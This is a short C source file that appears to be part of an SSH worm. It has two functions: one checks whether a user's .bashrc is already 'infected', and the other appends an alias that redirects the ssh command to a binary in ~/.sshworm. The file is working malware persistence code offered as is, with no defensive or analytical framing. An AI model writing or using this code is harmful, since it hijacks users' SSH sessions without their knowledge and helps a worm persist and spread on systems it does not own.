#include "install.h"
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>

#include "utils.h"
#include "debug.h"

#define expsize(str) str, sizeof(str) - 1

int check_bashrc(const char *bashrc)
{
	char buf[4096];
	int res = BASHRC_NOT_INFECTED, fd, n, i = 0;

	fd = open(bashrc, O_RDONLY);
	if (fd == -1) {
		debug("failed to open %s", bashrc);
		res = BASHRC_NOT_EXISTS;
		goto end;
	}

	while (1) {
		n = read(fd, buf, sizeof(buf));
		if (n <= 0) {
			break;
		}

		if (match(buf, n, "alias ssh=\"~/.sshworm/ssh\"\n", &i)) {
			res = BASHRC_INFECTED;
			break;
		}
	}

	close(fd);

end:
	return res;
}

int infect_bashrc(const char *bashrc)
{
	int fd = open(bashrc, O_RDWR | O_APPEND);
	if (fd == -1) {
		return 1;
	}

	write(fd, expsize("\nalias ssh=\"~/.sshworm/ssh\"\n"));
	close(fd);

	return 0;
}
